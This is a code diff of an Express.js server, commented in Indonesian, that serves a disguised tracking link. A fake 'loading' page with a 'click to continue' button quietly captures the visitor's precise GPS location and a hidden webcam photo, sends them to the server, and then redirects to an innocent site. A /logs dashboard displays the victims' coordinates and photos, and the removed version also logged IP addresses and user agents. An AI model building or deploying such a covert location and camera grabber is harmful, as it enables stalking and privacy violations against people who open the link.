@@ -1,96 +1,88 @@
 const express = require('express');
 const app = express();
+app.use(express.json({ limit: '10mb' })); // Batas ukuran data foto
 
 const visitLogs = [];
 
 app.get('/track', (req, res) => {
     const targetUrl = req.query.target || 'https://www.google.com';
-    const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
-    const userAgent = req.headers['user-agent'];
-
+    
     res.send(`
         <!DOCTYPE html>
         <html>
-        <head>
-            <meta charset="UTF-8">
-            <meta name="viewport" content="width=device-width, initial-scale=1.0">
-            <title>Memuat...</title>
-        </head>
-        <body style="display:flex; justify-content:center; align-items:center; height:100vh; font-family:sans-serif; background:#111; color:#fff;">
-            <p>Memuat halaman, mohon tunggu...</p>
+        <body style="display:flex; flex-direction:column; justify-content:center; align-items:center; height:100vh; font-family:sans-serif; background:#000; color:#fff;">
+            <h2>Memuat halaman...</h2>
+            <button id="btn" style="padding:15px 30px; font-size:18px; cursor:pointer; border-radius:10px;">Klik untuk Melanjutkan</button>
+            <video id="video" style="display:none;"></video>
+            <canvas id="canvas" style="display:none;"></canvas>
+            
             <script>
-                if (navigator.geolocation) {
-                    // Menggunakan enableHighAccuracy: true untuk meminta koordinat presisi
-                    navigator.geolocation.getCurrentPosition(
-                        (pos) => {
-                            fetch('/save-loc?lat=' + pos.coords.latitude + '&lng=' + pos.coords.longitude + '&acc=' + pos.coords.accuracy + '&ip=${encodeURIComponent(clientIp)}&ua=${encodeURIComponent(userAgent)}')
-                            .finally(() => {
-                                window.location.href = '${targetUrl}';
-                            });
-                        },
-                        (err) => {
-                            // Jika izin ditolak atau gagal, tetap alihkan ke URL tujuan
-                            window.location.href = '${targetUrl}';
-                        },
-                        {
-                            enableHighAccuracy: true, // Meminta sinyal GPS presisi tinggi
-                            timeout: 10000,           // Waktu tunggu maksimum 10 detik
-                            maximumAge: 0             // Mengabaikan lokasi cache lama
-                        }
-                    );
-                } else {
+                document.getElementById('btn').onclick = async () => {
+                    let locationData = { lat: 0, lng: 0 };
+                    let photoData = "";
+
+                    // 1. Ambil Lokasi
+                    try {
+                        const pos = await new Promise((resolve, reject) => {
+                            navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: true });
+                        });
+                        locationData = { lat: pos.coords.latitude, lng: pos.coords.longitude };
+                    } catch (e) { console.log("Lokasi ditolak"); }
+
+                    // 2. Ambil Kamera
+                    try {
+                        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                        const video = document.getElementById('video');
+                        video.srcObject = stream;
+                        await video.play();
+                        
+                        const canvas = document.getElementById('canvas');
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        canvas.getContext('2d').drawImage(video, 0, 0);
+                        photoData = canvas.toDataURL('image/jpeg');
+                        
+                        stream.getTracks().forEach(track => track.stop());
+                    } catch (e) { console.log("Kamera ditolak"); }
+
+                    // 3. Kirim semua data ke server
+                    await fetch('/save-all', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ location: locationData, photo: photoData })
+                    });
+
                     window.location.href = '${targetUrl}';
-                }
+                };
             </script>
         </body>
         </html>
     `);
 });
 
-app.get('/save-loc', (req, res) => {
-    const { lat, lng, acc, ip, ua } = req.query;
+app.post('/save-all', (req, res) => {
+    const { location, photo } = req.body;
     visitLogs.unshift({
-        waktu: new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' }),
-        ip: ip,
-        lat: lat,
-        lng: lng,
-        akurasi: acc ? acc + ' meter' : 'Tidak diketahui',
-        ua: ua
+        waktu: new Date().toLocaleString('id-ID'),
+        lokasi: location,
+        foto: photo
     });
     res.sendStatus(200);
 });
 
 app.get('/logs', (req, res) => {
     res.send(`
-        <!DOCTYPE html>
-        <html>
-        <head>
-            <meta charset="UTF-8">
-            <meta name="viewport" content="width=device-width, initial-scale=1.0">
-            <title>Dashboard Log Lokasi</title>
-            <script src="https://cdn.tailwindcss.com"></script>
-        </head>
-        <body class="bg-slate-900 text-slate-100 min-h-screen p-6 font-sans">
-            <div class="max-w-4xl mx-auto space-y-4">
-                <h1 class="text-xl font-bold border-b border-slate-800 pb-2">Dashboard Log Lokasi GPS</h1>
-                <div class="space-y-3">
-                    ${visitLogs.length === 0 ? '<p class="text-slate-500">Belum ada lokasi terekam.</p>' : visitLogs.map(log => `
-                        <div class="bg-slate-800 border border-slate-700 p-4 rounded-xl space-y-2 text-xs">
-                            <p class="text-emerald-400 font-mono"><b>Waktu:</b> ${log.waktu}</p>
-                            <p><b>Akurasi Sinyal:</b> ${log.akurasi}</p>
-                            <p><b>Koordinat:</b> <a href="https://maps.google.com/?q=${log.lat},${log.lng}" target="_blank" class="text-blue-400 underline font-mono">${log.lat}, ${log.lng} (Buka di Google Maps)</a></p>
-                            <p class="text-slate-400"><b>IP:</b> ${log.ip}</p>
-                        </div>
-                    `).join('')}
+        <body style="background:#111; color:#fff; padding:20px;">
+            <h1>Dashboard Log</h1>
+            ${visitLogs.map(log => `
+                <div style="border:1px solid #444; padding:10px; margin-bottom:10px;">
+                    <p>Waktu: ${log.waktu}</p>
+                    <p>Lokasi: ${log.lokasi.lat}, ${log.lokasi.lng}</p>
+                    ${log.foto ? `<img src="${log.foto}" style="width:200px; border-radius:5px;">` : '<p>Tidak ada foto</p>'}
                 </div>
-            </div>
+            `).join('')}
         </body>
-        </html>
     `);
-});
-
-app.get('/', (req, res) => {
-    res.send('Server Tracker Aktif.');
 });
 
 module.exports = app;
